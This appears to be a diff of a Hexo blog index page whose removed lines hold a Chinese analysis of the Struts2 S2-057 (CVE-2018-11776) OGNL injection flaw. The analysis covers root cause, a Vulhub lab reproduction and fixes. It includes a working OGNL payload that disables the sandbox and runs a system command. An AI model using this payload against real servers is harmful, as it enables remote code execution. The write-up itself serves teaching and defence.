@@ -96,284 +96,15 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h2 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1. 漏洞概述"></a>1. 漏洞概述</h2><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><p>Apache Struts2 S2-057 远程代码执行漏洞</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><ul>
-<li><p>  CVE：CVE-2018-11776</p>
-</li>
-<li><p>  Struts2编号：S2-057</p>
-</li>
-</ul>
-<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Apache Struts2 S2-057 是一个基于 OGNL</p>
-<p>表达式解析的远程代码执行漏洞。攻击者在满足特定 Struts2</p>
-<p>配置条件时，可以通过构造恶意 URL 控制 namespace，并利用 Struts2 的</p>
-<p>Result 处理流程触发表达式解析，最终导致服务器端执行任意代码。</p>
-<p>受影响版本：</p>
-<ul>
-<li><p>  Struts 2.3 - 2.3.34</p>
-</li>
-<li><p>  Struts 2.5 - 2.5.16</p>
-</li>
-</ul>
-<p>修复版本：</p>
-<ul>
-<li><p>  Struts 2.3.35</p>
-</li>
-<li><p>  Struts 2.5.17</p>
-</li>
-</ul>
-<p>参考 Apache 官方公告，该漏洞需要同时满足</p>
-<p><code>alwaysSelectFullNamespace=true</code> 以及 Action&#x2F;Result namespace</p>
-<p>配置缺失或通配等条件。</p>
-<hr>
-<h1 id="2-漏洞组件介绍"><a href="#2-漏洞组件介绍" class="headerlink" title="2. 漏洞组件介绍"></a>2. 漏洞组件介绍</h1><h2 id="2-1-Apache-Struts2"><a href="#2-1-Apache-Struts2" class="headerlink" title="2.1 Apache Struts2"></a>2.1 Apache Struts2</h2><p>Apache Struts2 是一个基于 Java 的 MVC Web 应用开发框架。</p>
-<p>基本请求流程：</p>
-<p>    HTTP Request</p>
-<p>          |</p>
-<p>          v</p>
-<p>    Struts Filter</p>
-<p>          |</p>
-<p>          v</p>
-<p>    ActionMapper</p>
-<p>          |</p>
-<p>          v</p>
-<p>    ActionProxy</p>
-<p>          |</p>
-<p>          v</p>
-<p>    Action执行</p>
-<p>          |</p>
-<p>          v</p>
-<p>    Result处理</p>
-<p>其中：</p>
-<ul>
-<li><p>  ActionMapper：负责解析 URL 中的 action 和 namespace。</p>
-</li>
-<li><p>  Action：业务逻辑执行单元。</p>
-</li>
-<li><p>  Result：负责 Action 执行后的跳转、页面返回或 Action 链调用。</p>
-</li>
-<li><p>  OGNL：Struts2 使用的表达式语言，用于访问对象属性以及动态表达式计算。</p>
-</li>
-</ul>
-<hr>
-<h1 id="3-漏洞成因分析"><a href="#3-漏洞成因分析" class="headerlink" title="3. 漏洞成因分析"></a>3. 漏洞成因分析</h1><h2 id="3-1-namespace-可控"><a href="#3-1-namespace-可控" class="headerlink" title="3.1 namespace 可控"></a>3.1 namespace 可控</h2><p>正常情况下，namespace 来源于 Struts 配置：</p>
-<p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">namespace</span>=<span class="string">&quot;/user&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>访问：</p>
-<p>    &#x2F;user&#x2F;login.action</p>
-<p>对应：</p>
-<p>    namespace&#x3D;&#x2F;user</p>
-<p>    action&#x3D;login</p>
-<p>但是当配置：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>开启后，Struts 会直接从请求 URL 中获取 namespace。</p>
-<p>例如：</p>
-<p>请求：</p>
-<p>    &#x2F;${233*233}&#x2F;actionChain1.action</p>
-<p>解析后：</p>
-<p>    namespace&#x3D;&#x2F;${233*233}</p>
-<p>    action&#x3D;actionChain1</p>
-<p>此时 namespace 已经由用户输入控制。</p>
-<hr>
-<h2 id="3-2-namespace-进入-Result-处理流程"><a href="#3-2-namespace-进入-Result-处理流程" class="headerlink" title="3.2 namespace 进入 Result 处理流程"></a>3.2 namespace 进入 Result 处理流程</h2><p>需要注意：</p>
-<p>namespace 本身不会直接执行 OGNL。</p>
-<p>漏洞触发链：</p>
-<p>    用户输入URL</p>
-<p>            |</p>
-<p>            v</p>
-<p>    DefaultActionMapper解析namespace</p>
-<p>            |</p>
-<p>            v</p>
-<p>    ActionMapping保存namespace</p>
-<p>            |</p>
-<p>            v</p>
-<p>    Action执行</p>
-<p>            |</p>
-<p>            v</p>
-<p>    Result处理</p>
-<p>            |</p>
-<p>            v</p>
-<p>    读取namespace生成目标Action URL</p>
-<p>            |</p>
-<p>            v</p>
-<p>    TextParseUtil解析表达式</p>
-<p>            |</p>
-<p>            v</p>
-<p>    OGNL执行</p>
-<hr>
-<h2 id="3-3-ActionChain-redirectAction-触发解析"><a href="#3-3-ActionChain-redirectAction-触发解析" class="headerlink" title="3.3 ActionChain &#x2F; redirectAction 触发解析"></a>3.3 ActionChain &#x2F; redirectAction 触发解析</h2><p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;actionChain1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">&quot;chain&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        actionChain2</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>或者：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">&quot;redirectAction&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这些 Result 类型需要重新生成 Action 地址。</p>
-<p>生成过程中会读取：</p>
-<p>    namespace</p>
-<p>如果 namespace 中包含：</p>
-<p>    ${233*233}</p>
-<p>Struts 会调用：</p>
-<p>    TextParseUtil.translateVariables()</p>
-<p>进行表达式解析。</p>
-<p>随后进入：</p>
-<p>    OgnlUtil</p>
-<p>          |</p>
-<p>          v</p>
-<p>    OGNL解析器</p>
-<p>最终：</p>
-<p>    ${233*233}</p>
-<p>被计算为：</p>
-<p>    54289</p>
-<hr>
-<h1 id="4-漏洞利用必要环境配置"><a href="#4-漏洞利用必要环境配置" class="headerlink" title="4. 漏洞利用必要环境配置"></a>4. 漏洞利用必要环境配置</h1><p>利用 S2-057 需要满足以下条件：</p>
-<h2 id="4-1-Struts版本"><a href="#4-1-Struts版本" class="headerlink" title="4.1 Struts版本"></a>4.1 Struts版本</h2><p>目标环境：</p>
-<p>    Struts 2.3.x &lt;&#x3D; 2.3.34</p>
-<p>    或</p>
-<p>    Struts 2.5.x &lt;&#x3D; 2.5.16</p>
-<hr>
-<h2 id="4-2-开启-alwaysSelectFullNamespace"><a href="#4-2-开启-alwaysSelectFullNamespace" class="headerlink" title="4.2 开启 alwaysSelectFullNamespace"></a>4.2 开启 alwaysSelectFullNamespace</h2><p>配置：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>该配置导致 namespace 可以从 URL 中获取。</p>
-<hr>
-<h2 id="4-3-Action配置存在缺陷"><a href="#4-3-Action配置存在缺陷" class="headerlink" title="4.3 Action配置存在缺陷"></a>4.3 Action配置存在缺陷</h2><p>例如：</p>
-<ul>
-<li><p>  package 没有设置 namespace</p>
-</li>
-<li><p>  使用通配 namespace</p>
-</li>
-<li><p>  Result 没有明确指定 namespace</p>
-</li>
-</ul>
-<p>并且存在：</p>
-<ul>
-<li><p>  chain</p>
-</li>
-<li><p>  redirectAction</p>
-</li>
-<li><p>  postback</p>
-</li>
-</ul>
-<p>等会处理 Action 路径的 Result 类型。</p>
-<hr>
-<h1 id="5-Vulhub环境验证"><a href="#5-Vulhub环境验证" class="headerlink" title="5. Vulhub环境验证"></a>5. Vulhub环境验证</h1><h2 id="5-1-启动环境"><a href="#5-1-启动环境" class="headerlink" title="5.1 启动环境"></a>5.1 启动环境</h2><p>进入 Vulhub：</p>
-<p>    cd vulhub&#x2F;struts2&#x2F;s2-057</p>
-<p>启动：</p>
-<p>    docker-compose up -d</p>
-<p>启动后访问：</p>
-<p>    <a target="_blank" rel="noopener" href="http://your-ip:8080/struts2-showcase">http://your-ip:8080/struts2-showcase</a></p>
-<hr>
-<h2 id="5-2-验证OGNL表达式执行"><a href="#5-2-验证OGNL表达式执行" class="headerlink" title="5.2 验证OGNL表达式执行"></a>5.2 验证OGNL表达式执行</h2><p>访问：</p>
-<p>    <a target="_blank" rel="noopener" href="http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action">http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action</a></p>
-<p>URL解码：</p>
-<p>    ${233*233}</p>
-<p>执行流程：</p>
-<p>    请求</p>
-<p>     |</p>
-<p>     v</p>
-<p>    namespace&#x3D;&#x2F;${233*233}</p>
-<p>     |</p>
-<p>     v</p>
-<p>    action&#x3D;actionChain1</p>
-<p>     |</p>
-<p>     v</p>
-<p>    Action执行</p>
-<p>     |</p>
-<p>     v</p>
-<p>    ActionChainResult处理</p>
-<p>     |</p>
-<p>     v</p>
-<p>    解析namespace</p>
-<p>     |</p>
-<p>     v</p>
-<p>    OGNL计算</p>
-<hr>
-<h2 id="5-3-验证结果"><a href="#5-3-验证结果" class="headerlink" title="5.3 验证结果"></a>5.3 验证结果</h2><p>如果漏洞存在，页面跳转或响应中会出现：</p>
-<p>    54289</p>
-<p>因为：</p>
-<p>    233 * 233 &#x3D; 54289</p>
-<p>说明：</p>
-<p>    namespace可控</p>
-<p>            +</p>
-<p>    Result触发表达式解析</p>
-<p>            +</p>
-<p>    OGNL执行成功<img src="https://cdn.jsdelivr.net/gh/dzlzlzl301-creator/hexo-image@main/img20260713193735886.png" alt="222.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/dzlzlzl301-creator/hexo-image@main/img20260713193742413.png" alt="111.png"></p>
-<h2 id="5-4任意命令执行"><a href="#5-4任意命令执行" class="headerlink" title="5.4任意命令执行"></a>5.4任意命令执行</h2><p>${(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[‘struts.valueStack’].context).(#cr&#x3D;#ct[‘com.opensymphony.xwork2.ActionContext.container’]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(‘id’)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}</p>
-<p>将payload进行url编码<br><a target="_blank" rel="noopener" href="http://your-ip:8080/struts2-showcase/url%E7%BC%96%E7%A0%81payload/actionChain1.action">http://your-ip:8080/struts2-showcase/url编码payload/actionChain1.action</a></p>
-<hr>
-<h1 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6. 漏洞修复"></a>6. 漏洞修复</h1><h2 id="6-1-升级Struts版本"><a href="#6-1-升级Struts版本" class="headerlink" title="6.1 升级Struts版本"></a>6.1 升级Struts版本</h2><p>推荐升级：</p>
-<p>    Struts 2.3.35+</p>
-<p>    或</p>
-<p>    Struts 2.5.17+</p>
-<p>这是官方推荐修复方式。</p>
-<hr>
-<h2 id="6-2-修复namespace配置"><a href="#6-2-修复namespace配置" class="headerlink" title="6.2 修复namespace配置"></a>6.2 修复namespace配置</h2><p>所有 Action 和 package 明确指定 namespace：</p>
-<p>示例：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;app&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">namespace</span>=<span class="string">&quot;/app&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>避免：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">namespace=&quot;*&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>或者：</p>
-<p>    namespace缺失</p>
-<hr>
-<h2 id="6-3-Result明确指定namespace"><a href="#6-3-Result明确指定namespace" class="headerlink" title="6.3 Result明确指定namespace"></a>6.3 Result明确指定namespace</h2><p>避免：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">&quot;redirectAction&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    login</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>推荐：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">&quot;redirectAction&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;namespace&quot;</span>&gt;</span>/user<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;actionName&quot;</span>&gt;</span>login<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="6-4-安全开发建议"><a href="#6-4-安全开发建议" class="headerlink" title="6.4 安全开发建议"></a>6.4 安全开发建议</h2><ul>
-<li><p>  不信任来自 URL 的 namespace。</p>
-</li>
-<li><p>  避免动态拼接 Action 路径。</p>
-</li>
-<li><p>  关闭不必要的 OGNL 动态解析能力。</p>
-</li>
-<li><p>  定期升级 Struts 组件。</p>
-</li>
-</ul>
-<hr>
-<h1 id="7-漏洞总结"><a href="#7-漏洞总结" class="headerlink" title="7. 漏洞总结"></a>7. 漏洞总结</h1><p>S2-057 的本质：</p>
-<p>    URL可控输入</p>
-<p>          |</p>
-<p>          v</p>
-<p>    namespace污染</p>
-<p>          |</p>
-<p>          v</p>
-<p>    Result处理namespace</p>
-<p>          |</p>
-<p>          v</p>
-<p>    TextParseUtil解析</p>
-<p>          |</p>
-<p>          v</p>
-<p>    OGNL表达式执行</p>
-<p>          |</p>
-<p>          v</p>
-<p>    远程代码执行</p>
-<p>漏洞核心不是 namespace 直接执行，而是：</p>
-<blockquote>
-<p>用户控制 namespace 后，Struts 在 Result 生成 Action URL</p>
-</blockquote>
-<blockquote>
-<p>时错误地将其作为表达式解析。</p>
-</blockquote>
-<hr>
-<h1 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8. 参考链接"></a>8. 参考链接</h1><ol>
-<li> Vulhub Struts2 S2-057环境说明：</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-057/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-057/README.zh-cn.md</a></p>
-<ol start="2">
-<li> 某微信公众号文章：</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg">https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg</a></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2026/07/13/S2-057-CVE-2018-11776/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/13/S2-057-CVE-2018-11776/" data-id="cuidUWzXcxuJKfvA05KougRht" data-title="S2-057-CVE-2018-11776" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/13/S2-057-CVE-2018-11776/" data-id="cuidR62ZD6LlYGDZ7C29Bqkx1" data-title="S2-057-CVE-2018-11776" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -418,7 +149,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/12/Struts2-S2-045-CVE-2017-5638/" data-id="cuidDRCCLjdLEQoAR0c10gsC0" data-title="CVE-2017-5638-Struts2_S2-045漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/12/Struts2-S2-045-CVE-2017-5638/" data-id="cuidkOL_z6jCiJn9g0hj15wL0" data-title="CVE-2017-5638-Struts2_S2-045漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -463,7 +194,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/11/Spring4Shell-CVE-2022-22965/" data-id="cuidbOUdfqaTIpzsLUDWvTyZd" data-title="Spring4Shell_CVE-2022-22965" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/11/Spring4Shell-CVE-2022-22965/" data-id="cuidC4U_8WIlxlMUVwTjLUJhN" data-title="Spring4Shell_CVE-2022-22965" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -509,7 +240,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/10/Spring-Cloud-Gateway-CVE-2022-22947/" data-id="cuidFXDGGVXL-UETKQ37r2_Eu" data-title="CVE-2022-22947_Spring_Cloud_Gateway" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/10/Spring-Cloud-Gateway-CVE-2022-22947/" data-id="cuidPQbyRwWbG5b88SJoEYKva" data-title="CVE-2022-22947_Spring_Cloud_Gateway" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -554,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/08/Log4j2-CVE-2021-44228/" data-id="cuidPqVaGrQPowoZDxrczWHRo" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/08/Log4j2-CVE-2021-44228/" data-id="cuid3V7rk9UVCeCnuMamnfzJC" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
